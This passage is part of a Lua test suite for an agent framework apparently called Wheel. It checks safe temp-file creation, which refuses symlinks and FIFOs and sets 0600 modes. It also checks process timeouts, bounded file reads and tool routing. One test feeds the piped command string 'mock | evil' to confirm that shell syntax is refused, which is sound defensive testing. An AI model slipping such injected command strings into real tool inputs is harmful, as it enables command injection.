  assert(WheelHost.fs.read_file(path) == "payload", "an existing file must not be truncated")

  local target = WheelHost.tmp.name()
  assert(WheelHost.tmp.create_exclusive(target, "target-content") == true)
  local link = WheelHost.tmp.name()
  os.execute("ln -s " .. WheelHost.proc.shell_quote(target) .. " " .. WheelHost.proc.shell_quote(link))
  local linked, link_err = WheelHost.tmp.create_exclusive(link, "link-payload")
  assert(linked == false and type(link_err) == "string",
    "a pre-existing symlink must be refused")
  assert(WheelHost.fs.read_file(target) == "target-content",
    "a symlink target must never be followed or overwritten")

  local dev_link = WheelHost.tmp.name()
  os.execute("ln -s /dev/null " .. WheelHost.proc.shell_quote(dev_link))
  local dev_ok, dev_err = WheelHost.tmp.create_exclusive(dev_link, "dev-payload")
  assert(dev_ok == false and type(dev_err) == "string",
    "a symlink to /dev/null must be refused")
  WheelHost.fs.remove_file(dev_link)

  local fifo = WheelHost.tmp.name()
  os.execute("mkfifo " .. WheelHost.proc.shell_quote(fifo))
  local fifo_ok, fifo_err = WheelHost.tmp.create_exclusive(fifo, "fifo-payload")
  assert(fifo_ok == false and type(fifo_err) == "string",
    "a pre-existing FIFO must be refused without blocking")
  WheelHost.fs.remove_file(fifo)

  local created = WheelHost.tmp.create("fresh")
  assert(type(created) == "string", "tmp.create must return a path")
  assert(WheelHost.fs.read_file(created) == "fresh")
  assert(WheelHost.fs.stat(created).mode == 384, "tmp.create must produce mode 0600")

  WheelHost.fs.remove_file(path)
  WheelHost.fs.remove_file(target)
  WheelHost.fs.remove_file(link)
  WheelHost.fs.remove_file(created)
end)

run_test("WheelHost: temp write failure surfaces cleanup errors", function()
  local path = WheelHost.tmp.name()
  local real_open = io.open
  local real_remove = os.remove
  local probe_path = nil
  io.open = function(target, mode)
    if mode == "r+" then
      probe_path = target
      return nil, "simulated write-open failure"
    end
    return real_open(target, mode)
  end
  os.remove = function(target)
    if target == probe_path then
      return nil, "simulated remove failure"
    end
    return real_remove(target)
  end
  local ok, err = WheelHost.tmp.create_exclusive(path, "content")
  io.open = real_open
  os.remove = real_remove
  assert(ok == false and type(err) == "string", "a temp write failure must fail closed")
  assert(err:find("cleanup failed", 1, true) ~= nil,
    "a temp cleanup failure must be surfaced")
  if probe_path then
    real_remove(probe_path)
  end
  real_remove(path)
end)

run_test("WheelHost: process capture files are cleaned up on success, error, and timeout", function()
  local root = test_path("test_host_proc_cleanup")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local backend = WheelHost.create_backend("standalone", { tmp_root = root })

  local function leftovers()
    local names = {}
    local pipe = io.popen("ls -1a " .. WheelHost.proc.shell_quote(root))
    if pipe then
      for line in pipe:lines() do
        if line:match("^wheel%-") then
          names[#names + 1] = line
        end
      end
      pipe:close()
    end
    return names
  end

  local success = backend.run_program("echo", { "ok" })
  assert(success.ok and success.code == 0 and #leftovers() == 0,
    "successful runs must remove capture files")

  local error_run = backend.run_program("sh", { "-c", "exit 3" })
  assert(error_run.code == 3 and #leftovers() == 0,
    "failed runs must remove capture files")

  local timed = backend.run_program("sh", { "-c", "sleep 5" }, { timeout_ms = 100 })
  assert(timed.timed_out and #leftovers() == 0,
    "timed-out runs must remove capture files")

  -- A spawn failure must also clean up and remain typed.
  local warm = backend.run_program("true")
  assert(warm.ok, "the tool cache must warm before the spawn-failure probe")
  local real_popen = io.popen
  io.popen = function()
    return nil
  end
  local spawn_failed = backend.run_program("true")
  io.popen = real_popen
  assert(spawn_failed.ok == false and spawn_failed.outcome == WheelHost.PROCESS_OUTCOME.FAILURE,
    "a failed spawn must be a typed failure")
  assert(#leftovers() == 0, "a failed spawn must remove capture files")

  -- Cleanup failure is typed and capture files are created 0600.
  local real_remove = os.remove
  local failed_path = nil
  os.remove = function(path)
    if failed_path == nil and path:match("^/.*/wheel%-") then
      failed_path = path
      return nil, "simulated cleanup failure"
    end
    return real_remove(path)
  end
  local cleanup_failed = backend.run_program("echo", { "cleanup" })
  os.remove = real_remove
  assert(cleanup_failed.ok == false and cleanup_failed.outcome == WheelHost.PROCESS_OUTCOME.FAILURE,
    "a cleanup failure must be a typed failure")
  assert(cleanup_failed.stderr:find("cleanup failed", 1, true) ~= nil,
    "a cleanup failure must be reported")
  assert(type(failed_path) == "string", "the cleanup failure must identify a capture file")
  local failed_info = WheelHost.fs.stat(failed_path)
  assert(failed_info.mode == 384, "capture files must be mode 0600")

  for _, path in ipairs(leftovers()) do
    real_remove(root .. "/" .. path)
  end
  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: missing sleep and timeout are typed unavailable outcomes", function()
  local root = test_path("test_host_missing_sweep_tools")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local function probe(name)
    local backend = WheelHost.create_backend("standalone", { tmp_root = root })
    local real_popen = io.popen
    io.popen = function(command, mode)
      if command:find(name, 1, true) ~= nil then
        return nil
      end
      return real_popen(command, mode)
    end
    local res = backend.run_program("true")
    io.popen = real_popen
    return res
  end
  local no_timeout = probe("timeout")
  assert(no_timeout.ok == false and no_timeout.outcome == WheelHost.PROCESS_OUTCOME.UNAVAILABLE,
    "a missing timeout must fail closed as unavailable")
  assert(no_timeout.stderr:find("timeout", 1, true) ~= nil)
  local no_sleep = probe("sleep")
  assert(no_sleep.ok == false and no_sleep.outcome == WheelHost.PROCESS_OUTCOME.UNAVAILABLE,
    "a missing sleep must fail closed as unavailable")
  assert(no_sleep.stderr:find("sleep", 1, true) ~= nil)
  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: missing setsid is a typed unavailable outcome", function()
  local root = test_path("test_host_no_setsid")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local backend = WheelHost.create_backend("standalone", { tmp_root = root })
  local real_popen = io.popen
  io.popen = function(command, mode)
    if command:find("setsid", 1, true) ~= nil then
      return nil
    end
    return real_popen(command, mode)
  end
  local res = backend.run_program("true")
  io.popen = real_popen
  assert(res.ok == false and res.outcome == WheelHost.PROCESS_OUTCOME.UNAVAILABLE,
    "a missing setsid must fail closed as unavailable")
  assert(res.stderr:find("setsid", 1, true) ~= nil, "the unavailable outcome must name setsid")
  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: read_file enforces max_bytes while reading", function()
  local root = test_path("test_tool_read_bounded")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local fh = assert(io.open(root .. "/big.txt", "w"))
  for index = 1, 20 do
    fh:write(string.format("line-%02d-payload\n", index))
  end
  fh:close()

  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local tool = reg:get_tool("read_file")

  local saved_read_file = WheelHost.fs.read_file
  WheelHost.fs.read_file = function()
    error("read_file must not load the whole file for a bounded read")
  end
  local ok, res = pcall(tool.execute, { path = "big.txt", max_bytes = 40 }, env)
  WheelHost.fs.read_file = saved_read_file

  assert(ok, "bounded read must not call fs.read_file: " .. tostring(res))
  assert(res.success == true)
  assert(res.stdout:find("output truncated", 1, true) ~= nil,
    "the bounded read must report truncation")
  assert(#res.stdout < 20 * 18, "the output must stay far below the whole file size")

  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: run_command reports a typed timeout", function()
  local root = test_path("test_tool_run_timeout")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)

  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local res = reg:dispatch("run_command", { command = "sleep 5", timeout_ms = 300 }, env)

  assert(res.success == false, "a timed-out command must fail")
  assert(res.timed_out == true and res.outcome == WheelHost.PROCESS_OUTCOME.TIMEOUT,
    "the tool result must carry the typed timeout")
  assert(res.exit_code == 124 or res.exit_code == 137,
    "the timeout exit code must be 124/137, got " .. tostring(res.exit_code))
  assert(res.stderr:find("timed out", 1, true) ~= nil, "the tool must explain the timeout")

  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: read_file fails loud when start_line exceeds the bounded prefix", function()
  local root = test_path("test_tool_read_start_line")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local fh = assert(io.open(root .. "/big.txt", "w"))
  for index = 1, 2000 do
    fh:write(string.format("line-%04d-%s\n", index, string.rep("x", 40)))
  end
  fh:close()

  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local tool = reg:get_tool("read_file")

  local bounded = tool.execute({ path = "big.txt", start_line = 1990 }, env)
  assert(bounded.success == false, "a start_line beyond the bounded prefix must fail loud")
  assert(bounded.exit_code == 1 and bounded.truncated == true,
    "the bounded-prefix failure must be typed as truncated")
  assert(bounded.stderr:find("bounded read prefix", 1, true) ~= nil,
    "the failure must explain the bounded prefix")

  local expanded = tool.execute({
    path = "big.txt",
    start_line = 1990,
    max_bytes = WheelTool.MAX_READ_BYTES,
  }, env)
  assert(expanded.success == true and expanded.lines_read > 0,
    "a larger max_bytes must reach the requested start_line")

  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: read_file marks a partial line at the bounded prefix", function()
  local root = test_path("test_tool_read_partial")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local fh = assert(io.open(root .. "/partial.txt", "w"))
  fh:write(string.rep("a", 50) .. "\n" .. string.rep("b", 100) .. "\n" .. "c\n")
  fh:close()
  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local tool = reg:get_tool("read_file")

  local partial = tool.execute({ path = "partial.txt", max_bytes = 100, start_line = 2 }, env)
  assert(partial.success == true)
  assert(partial.truncated == true,
    "a prefix ending inside an included line must be marked truncated")
  assert(partial.stdout:find("output truncated", 1, true) ~= nil,
    "the partial-line result must carry a truncation marker")

  local complete = tool.execute({ path = "partial.txt", max_bytes = 100, start_line = 1, end_line = 1 }, env)
  assert(complete.success == true and complete.truncated == false,
    "a complete in-range line must not be marked truncated")
  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: search_code fails on grep errors", function()
  local root = test_path("test_tool_search_errors")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local fh = assert(io.open(root .. "/file.txt", "w"))
  fh:write("needle\n")
  fh:close()

  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local tool = reg:get_tool("search_code")

  local no_match = tool.execute({ query = "absent" }, env)
  assert(no_match.success == true and no_match.stdout == "",
    "grep exit 1 must remain a successful no-match")

  local missing = tool.execute({ query = "needle", path = "missing-directory" }, env)
  assert(missing.success == false and missing.exit_code == 2,
    "a grep I/O failure must fail with exit code 2")
  assert(#missing.stderr > 0, "a grep I/O failure must retain stderr")

  local saved_getenv = os.getenv
  os.getenv = function(name)
    if name == "PATH" then
      return "/nonexistent"
    end
    return saved_getenv(name)
  end
  local no_grep = tool.execute({ query = "needle" }, env)
  os.getenv = saved_getenv
  assert(no_grep.success == false and no_grep.exit_code == 127,
    "a missing grep must fail with exit code 127")
  assert(no_grep.stderr:find("grep", 1, true) ~= nil,
    "a missing grep must retain its diagnostic")

  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: list_directory fails closed on missing ls and timeout", function()
  local root = test_path("test_tool_list_errors")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local tool = reg:get_tool("list_directory")

  local missing = tool.execute({ path = "missing-directory" }, env)
  assert(missing.success == false and missing.exit_code == 2,
    "a missing directory must fail with the ls exit code")
  assert(#missing.stderr > 0, "a missing directory must retain ls stderr")

  local saved_getenv = os.getenv
  os.getenv = function(name)
    if name == "PATH" then
      return "/nonexistent"
    end
    return saved_getenv(name)
  end
  local no_ls = tool.execute({ path = "." }, env)
  os.getenv = saved_getenv
  assert(no_ls.success == false and no_ls.exit_code == 127,
    "a missing ls must fail with exit code 127")
  assert(no_ls.stderr:find("ls", 1, true) ~= nil,
    "a missing ls must retain its diagnostic")

  local saved_list = WheelHost.fs.list_dir
  WheelHost.fs.list_dir = function()
    return {
      ok = true, code = 0, entries = { "entry" }, total = 1,
      truncated = true, stdout = "entry", stderr = "",
    }
  end
  local truncated_list = tool.execute({ path = "." }, env)
  assert(truncated_list.success == true and truncated_list.truncated == true,
    "list_directory must surface capture truncation")

  WheelHost.fs.list_dir = function()
    return {
      ok = false, code = 124, timed_out = true,
      outcome = WheelHost.PROCESS_OUTCOME.TIMEOUT, entries = {}, stderr = "",
    }
  end
  local timed = tool.execute({ path = "." }, env)
  WheelHost.fs.list_dir = saved_list
  assert(timed.success == false and timed.timed_out == true,
    "a list timeout must fail with the typed timeout")
  assert(timed.exit_code == 124 or timed.exit_code == 137,
    "a list timeout must preserve 124/137")

  os.execute("rm -rf " .. root)
end)

run_test("WheelTool: list_directory paginates entries", function()
  local root = test_path("test_tool_list_pagination")
  os.execute("rm -rf " .. root .. " && mkdir -p " .. root)
  for index = 1, 5 do
    local fh = assert(io.open(root .. "/file-" .. index .. ".txt", "w"))
    fh:write("x\n")
    fh:close()
  end
  local reg = WheelTool.get_default_registry()
  local env = { workspace_root = root, role = WheelAgent.Role.CODING }
  local res = reg:get_tool("list_directory").execute({ path = ".", max_entries = 2 }, env)
  assert(res.success == true)
  assert(res.total_entries >= 5, "pagination must count all entries")
  local returned = 0
  for _ in res.stdout:gmatch("\n") do
    returned = returned + 1
  end
  if #res.stdout > 0 and res.stdout:sub(-1) ~= "\n" then
    returned = returned + 1
  end
  assert(returned <= 2, "pagination must cap returned entries, got " .. returned)
  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: tool call sites route through the seam (capture doubles)", function()
  local root = test_path("test_host_seam_routes")
  os.execute("rm -rf " .. root)

  local backend = WheelHost.backend
  local saved = {
    mkdir_p = backend.mkdir_p,
    list_dir = backend.list_dir,
    read_file = backend.read_file,
    write_file = backend.write_file,
    exists = backend.exists,
    remove_file = backend.remove_file,
    run_command = backend.run_command,
    run_program = backend.run_program,
    now = backend.now,
    clock = backend.clock,
  }
  local calls = {}
  local clock_calls = 0
  backend.mkdir_p = function(path)
    table.insert(calls, { kind = "mkdir_p", path = path })
    return saved.mkdir_p(path)
  end
  backend.list_dir = function(path)
    table.insert(calls, { kind = "list_dir", path = path })
    return {
      ok = true,
      code = 0,
      stdout = "listing-a\nlisting-b",
      stderr = "",
      entries = { "listing-a", "listing-b" },
      total = 2,
    }
  end
  backend.read_file = function(path)
    table.insert(calls, { kind = "read_file", path = path })
    return saved.read_file(path)
  end
  backend.write_file = function(path, content)
    table.insert(calls, { kind = "write_file", path = path })
    return saved.write_file(path, content)
  end
  backend.exists = function(path)
    table.insert(calls, { kind = "exists", path = path })
    return saved.exists(path)
  end
  backend.remove_file = function(path)
    table.insert(calls, { kind = "remove_file", path = path })
    return saved.remove_file(path)
  end
  backend.run_command = function(shell_string)
    table.insert(calls, { kind = "run_command", command = shell_string })
    return { ok = true, code = 0, stdout = "seam-stdout", stderr = "" }
  end
  backend.run_program = function(program, args)
    table.insert(calls, { kind = "run_program", program = program, args = args })
    return { ok = true, code = 0, stdout = "match-a\nmatch-b", stderr = "" }
  end
  backend.now = function()
    return 1234567890
  end
  backend.clock = function()
    clock_calls = clock_calls + 1
    if clock_calls == 1 then
      return 10
    end
    return 10.5
  end

  local ok, err = pcall(function()
    local reg = WheelTool.get_default_registry()
    local env = { workspace_root = root, role = WheelAgent.Role.CODING }

    -- write_file -> fs.exists / fs.mkdir_p / fs.write_file
    local w = reg:dispatch("write_file", { path = "routed/sample.txt", content = "x", overwrite = true }, env)
    assert(w.success == true, "write_file must succeed: " .. tostring(w.stderr))
    assert(w.duration_ms == 500, "dispatch must measure CPU time through WheelHost.time.clock")

    -- read_file / edit_file -> fs.read_file + fs.write_file
    local r_file = reg:dispatch("read_file", { path = "routed/sample.txt" }, env)
    assert(r_file.success == true, "read_file must succeed: " .. tostring(r_file.stderr))
    assert(r_file.stdout == "x", "read_file must return host content")
    local e = reg:dispatch("edit_file", {
      path = "routed/sample.txt",
      target = "x",
      replacement = "edited",
    }, env)
    assert(e.success == true, "edit_file must succeed: " .. tostring(e.stderr))

    -- run_command -> proc.run_command (explicit shell-string primitive)
    local r = reg:dispatch("run_command", { command = "echo routed" }, env)
    assert(r.success == true, "run_command must succeed")
    assert(r.stdout == "seam-stdout", "run_command output must come from the seam")

    -- list_directory -> fs.list_dir
    local l = reg:get_tool("list_directory").execute({ path = "." }, env)
    assert(l.success == true)
    assert(l.stdout == "listing-a\nlisting-b", "list_directory output must come from the seam")
    assert(l.total_entries == 2)

    -- search_code -> proc.run_program (argv, no shell string)
    local s = reg:dispatch("search_code", { query = "routed" }, env)
    assert(s.success == true)
    assert(s.stdout == "match-a\nmatch-b\n", "search_code output must come from the seam and keep the trailing newline")

    -- fs.remove_file -> provider temp cleanup path
    local removed = WheelHost.fs.remove_file(root .. "/routed/sample.txt")
    assert(removed == true, "remove_file must remove the temp file")

    -- auto-spillover action ids -> time.now
    local outcome = WheelTool.process_spillover({ tool = "probe", success = true, stdout = "", stderr = "" })
    assert(outcome.action_id == "act-1234567890", "action id must use WheelHost.time.now")
  end)

  backend.mkdir_p = saved.mkdir_p
  backend.list_dir = saved.list_dir
  backend.read_file = saved.read_file
  backend.write_file = saved.write_file
  backend.exists = saved.exists
  backend.remove_file = saved.remove_file
  backend.run_command = saved.run_command
  backend.run_program = saved.run_program
  backend.now = saved.now
  backend.clock = saved.clock
  if not ok then
    error(err)
  end

  -- Each primitive was exercised by the expected call sites
  local mkdir_path, list_path = nil, nil
  local run_cmds, argv_calls = {}, {}
  local saw_read, saw_write, saw_exists, saw_remove = false, false, false, false
  for _, call in ipairs(calls) do
    if call.kind == "mkdir_p" then
      mkdir_path = call.path
    elseif call.kind == "list_dir" then
      list_path = call.path
    elseif call.kind == "read_file" then
      saw_read = true
    elseif call.kind == "write_file" then
      saw_write = true
    elseif call.kind == "exists" then
      saw_exists = true
    elseif call.kind == "remove_file" then
      saw_remove = true
    elseif call.kind == "run_command" then
      table.insert(run_cmds, call.command)
    elseif call.kind == "run_program" then
      table.insert(argv_calls, call)
    end
  end
  assert(mkdir_path == root .. "/routed", "write_file must create parents through fs.mkdir_p")
  assert(list_path == root, "list_directory must list through fs.list_dir: " .. tostring(list_path))
  assert(saw_read, "read_file/edit_file must read through fs.read_file")
  assert(saw_write, "write_file/edit_file must write through fs.write_file")
  assert(saw_exists, "write_file must test existence through fs.exists")
  assert(saw_remove, "temporary-file cleanup must use fs.remove_file")
  assert(#run_cmds == 1, "only the Execute-intent run_command may exercise the shell primitive")
  assert(string.find(run_cmds[1], "(echo routed) 2>&1", 1, true) ~= nil,
    "run_command must keep wrapping the command with cd/2>&1")
  assert(#argv_calls == 1, "search_code must execute through proc.run_program")
  assert(argv_calls[1].program == "grep", "search_code must invoke grep directly")
  local grep_argv = table.concat(argv_calls[1].args, " ")
  assert(string.find(grep_argv, "-rn", 1, true) ~= nil, "search_code must keep recursive line numbers")
  assert(string.find(grep_argv, "-F", 1, true) ~= nil, "search_code must keep fixed-string matching")
  assert(string.find(grep_argv, "routed", 1, true) ~= nil, "search_code must pass the query as argv")

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: StdioAdapter routes argv and stdin through the seam", function()
  local backend = WheelHost.backend
  local saved_run_program = backend.run_program
  local seen = nil

  backend.run_program = function(program, args, opts)
    seen = { program = program, args = args, opts = opts }
    return {
      ok = true,
      code = 0,
      exit_code = 0,
      stdout = "stdio-seam-output",
      stderr = "",
      outcome = WheelHost.PROCESS_OUTCOME.EXITED,
      timed_out = false,
      truncated = false,
    }
  end

  local ok, err = pcall(function()
    local stdio = WheelProvider.StdioAdapter.new({ command = "mock_model_cli --flag" })
    local res, complete_err = stdio:complete({
      messages = { { role = "user", content = "hello seam" } },
    })
    assert(res ~= nil, "stdio complete must succeed: " .. tostring(complete_err))
    assert(res.content == "stdio-seam-output")
  end)

  backend.run_program = saved_run_program
  if not ok then
    error(err)
  end
  assert(seen ~= nil, "StdioAdapter must execute through WheelHost.proc.run_program")
  assert(seen.program == "mock_model_cli", "the command must be split into argv")
  assert(seen.args[1] == "--flag", "argv must preserve the trailing argument")
  assert(type(seen.opts) == "table" and type(seen.opts.stdin) == "string",
    "the prompt must cross the seam as stdin")
  assert(seen.opts.stdin:find("hello seam", 1, true) ~= nil,
    "the stdin payload must contain the formatted prompt")
end)

run_test("WheelProvider: stdio command refusal, timeout, and output truncation are typed", function()
  local backend = WheelHost.backend
  local saved_run_program = backend.run_program

  -- Shell syntax is refused before any process starts.
  local via_shell = WheelProvider.StdioAdapter.new({ command = "mock | evil" })
  local shell_res, shell_err = via_shell:complete({ messages = {} })
  assert(shell_res == nil and type(shell_err) == "string"
    and shell_err:find("shell syntax", 1, true) ~= nil,
    "a shell-syntax stdio command must be refused")

  local timeout_res, timeout_err = nil, nil
  backend.run_program = function()
    return {
      ok = true,
      code = 124,
      exit_code = 124,
      stdout = "",
      stderr = "",
      outcome = WheelHost.PROCESS_OUTCOME.TIMEOUT,
      timed_out = true,
      truncated = false,
    }
  end
  local timed = WheelProvider.StdioAdapter.new({ command = "mock_model_cli", timeout_ms = 500 })
  timeout_res, timeout_err = timed:complete({ messages = {} })

  backend.run_program = function()
    return {
      ok = true,
      code = 0,
      exit_code = 0,
      stdout = "bounded",
      stderr = "",
      outcome = WheelHost.PROCESS_OUTCOME.EXITED,
      timed_out = false,
      truncated = true,
    }
  end
  local truncated = WheelProvider.StdioAdapter.new({ command = "mock_model_cli" })
  local trunc_res, trunc_err = truncated:complete({ messages = {} })

  backend.run_program = function()
    return {
      ok = true,
      code = 1,
      exit_code = 1,
      stdout = "",
      stderr = "stdio stderr detail",
      outcome = WheelHost.PROCESS_OUTCOME.EXITED,
      timed_out = false,
      truncated = false,
    }
  end
  local failed = WheelProvider.StdioAdapter.new({ command = "mock_model_cli" })
  local fail_res, fail_err = failed:complete({ messages = {} })

  backend.run_program = function()
    return {
      ok = true,
      code = 0,
      exit_code = 0,
      stdout = "model-answer",
      stderr = "cli warning",
      outcome = WheelHost.PROCESS_OUTCOME.EXITED,
      timed_out = false,
      truncated = false,
    }
  end
  local clean = WheelProvider.StdioAdapter.new({ command = "mock_model_cli" })
  local clean_res, clean_err = clean:complete({ messages = {} })

  backend.run_program = saved_run_program

  assert(timeout_res == nil and type(timeout_err) == "string"
    and timeout_err:find("timed out", 1, true) ~= nil,
    "a timed-out stdio process must fail with a typed message")
  assert(trunc_res == nil and type(trunc_err) == "string"
    and trunc_err:find("capture bound", 1, true) ~= nil,
    "truncated stdio output must fail closed instead of returning partial content")
  assert(fail_res == nil and type(fail_err) == "string"
    and fail_err:find("stdio stderr detail", 1, true) ~= nil,
    "nonzero stdio exit must retain stderr diagnostics")
  assert(clean_res ~= nil and clean_res.content == "model-answer",
    "successful stdio content must not include stderr diagnostics: " .. tostring(clean_err))
end)

run_test("WheelHost: Lua 5.2+ os.execute liveness probes fail closed", function()
  local saved_execute = os.execute
  local ok, err = pcall(function()
    os.execute = function() return 0 end
    assert(WheelHost.proc.is_alive(123) == true, "exit 0 must be alive")

    os.execute = function() return 256 end
    local alive, probe_err = WheelHost.proc.is_alive(123)
    assert(alive == false and probe_err == nil,
      "a Lua 5.1 exit status of 1 is a definite non-live probe")

    os.execute = function() return nil, "exit", 127 end
    alive, probe_err = WheelHost.proc.is_alive(123)
    assert(alive == false and type(probe_err) == "string",
      "a Lua 5.2+ probe failure must fail closed, not report a dead process")

    os.execute = function() return nil, "signal", 9 end
    alive, probe_err = WheelHost.proc.is_alive(123)
    assert(alive == false and type(probe_err) == "string",
      "a signalled probe must fail closed")

    os.execute = saved_execute
    local pid = WheelHost.proc.pid()
    assert(type(pid) == "number" and WheelHost.proc.is_alive(pid) == true,
      "a real liveness probe of the current process must succeed")
  end)
  os.execute = saved_execute
  if not ok then
    error(err)
  end
end)

run_test("WheelHost: private file, FIFO, and pid primitives", function()
  local root = test_path("wheel-host-ctx0024")
  os.execute("rm -rf " .. root)
  assert(WheelHost.fs.mkdir_p(root) == true)
  assert(WheelHost.fs.chmod(root, "700") == true)

  local euid = WheelHost.fs.euid()
  assert(type(euid) == "number" and euid >= 0, "euid must be readable")

  local file = root .. "/private.txt"
  assert(WheelHost.fs.create_private_file(file, "payload") == true)
  local file_info = WheelHost.fs.stat(file)
  assert(file_info.regular and file_info.mode == 384, "create must produce a 0600 regular file")
  assert(file_info.links == 1, "create must produce a singly linked file")
  assert(WheelHost.fs.create_private_file(file, "again") == false,
    "exclusive create must refuse an existing path")
  os.execute("ln -s " .. file .. " " .. root .. "/private.link")
  assert(WheelHost.fs.create_private_file(root .. "/private.link", "x") == false,
    "exclusive create must refuse a symlink")

  local linked = root .. "/linked.txt"
  assert(WheelHost.fs.link_exclusive(file, linked) == true,
    "link_exclusive must publish a new hard link")
  assert(WheelHost.fs.link_exclusive(file, linked) == false,
    "link_exclusive must never replace an existing target")
  assert(WheelHost.fs.stat(file).links == 2,
    "the restored link must share the original inode")
  assert(WheelHost.fs.remove_file(linked) == true)
  assert(WheelHost.fs.stat(file).links == 1)

  local fifo = root .. "/control.fifo"
  assert(WheelHost.fs.mkfifo(fifo) == true)
  local fifo_info = WheelHost.fs.stat(fifo)
  assert(fifo_info.fifo and fifo_info.mode == 384, "mkfifo must produce a 0600 FIFO")
  assert(fifo_info.links == 1, "mkfifo must produce a singly linked FIFO")
  assert(WheelHost.fs.mkfifo(fifo) == false, "mkfifo must refuse an existing path")
  local handle = assert(WheelHost.fs.open_fifo(fifo))
  assert(handle:write("ping"), "write to a verified FIFO handle must succeed")
  handle:flush()
  assert(handle:read(4) == "ping", "a verified FIFO handle must round trip bytes")
  handle:close()

  assert(WheelHost.fs.remove_dir(root) == false, "remove_dir must not remove a non-empty directory")
  assert(WheelHost.fs.remove_file(root .. "/private.link") == true)
  assert(WheelHost.fs.remove_file(file) == true)
  assert(WheelHost.fs.remove_file(fifo) == true)
  assert(WheelHost.fs.remove_dir(root) == true)

  local pid = WheelHost.proc.pid()
  assert(type(pid) == "number" and pid > 1, "the current pid must be readable")
  assert(WheelHost.proc.is_alive(pid) == true, "the current pid must be alive")
  local invalid_alive, invalid_err = WheelHost.proc.is_alive(0)
  assert(invalid_alive == false and type(invalid_err) == "string",
    "an invalid pid must fail the liveness probe")
end)

run_test("WheelHost: context and team wall-clock sites route through time.now", function()
  local backend = WheelHost.backend
  local saved_now = backend.now
  local saved_clock = backend.clock
  local fixed_now = 1700000000
  local clock_calls = 0
  backend.now = function()
    return fixed_now
  end
  backend.clock = function()
    clock_calls = clock_calls + 1
    if clock_calls == 1 then
      return 5
    end
    return 5.25
  end

  local ok, err = pcall(function()
    -- Context event bus -> ContextBus:publish
    local bus = WheelContext.ContextBus.new()
    local event = { type = "time_seam_probe" }
    bus:publish(event)
    assert(event.timestamp_ms == fixed_now * 1000, "bus event must use WheelHost.time.now")

    -- Context slot metadata and commit -> put_slot / commit_checkpoint
    local ctx = WheelContext.new({})
    local put = ctx:put_slot("seam/time", "routed")
    assert(put ~= nil and put.success == true, "put_slot must succeed")
    assert(ctx._slots["seam/time"].updated_at_ms == fixed_now * 1000,
      "slot updated_at_ms must use WheelHost.time.now")

    local commit = ctx:commit_checkpoint({ message = "time seam" })
    assert(commit.timestamp_ms == fixed_now * 1000,
      "commit timestamp must use WheelHost.time.now")

    -- Team handoff -> WheelTeam:handoff
    local kernel = WheelKernel.new({ in_memory = true })
    local team = WheelTeam.new({ kernel = kernel })
    team:spawn_agent({ name = "seam-worker", role = WheelAgent.Role.CODING })
    team:spawn_agent({ name = "seam-reviewer", role = WheelAgent.Role.REVIEWER })
    kernel:create_task({ id = "TASK-TIME-SEAM", title = "Wall-clock seam" })
    local claimed = team:claim_task("seam-worker", "TASK-TIME-SEAM")
    assert(claimed == true, "seam-worker must claim the task")
    local ho_ok, ho_record = team:handoff("seam-worker", "seam-reviewer", "TASK-TIME-SEAM")
    assert(ho_ok == true, "handoff must succeed: " .. tostring(ho_record))
    assert(ho_record.timestamp == fixed_now, "handoff timestamp must use WheelHost.time.now")

    -- Team orchestration duration -> WheelHost.time.clock
    clock_calls = 0
    local empty_kernel = WheelKernel.new({ in_memory = true })
    local empty_team = WheelTeam.new({ kernel = empty_kernel })
    empty_kernel:create_task({ id = "TASK-CLOCK-EMPTY", title = "Already complete" })
    empty_kernel:start_task("TASK-CLOCK-EMPTY", "clock-worker")
    empty_kernel:complete_task("TASK-CLOCK-EMPTY", 1)
    local report = empty_team:run_orchestration_loop()
    assert(report.duration_ms == 250,
      "orchestration duration must use WheelHost.time.clock, got " .. tostring(report.duration_ms))
  end)

  backend.now = saved_now
  backend.clock = saved_clock
  if not ok then
    error(err)
  end
end)

-- CTX-0026: versioned context snapshot coverage lives in a focused file that
-- receives the shared runner, so the suite keeps one PASS/FAIL contract.
local run_context_snapshot_tests = assert(loadfile("tests/test_context_snapshot.lua"))()
run_context_snapshot_tests(run_test)

-- Remove only this run's root; any caller-owned WHEEL_TEST_TMP base remains.
cleanup_test_run_root()

print("\n==========================================")
print("  All Wheel tests PASSED successfully! 🚀 ")
print("==========================================")




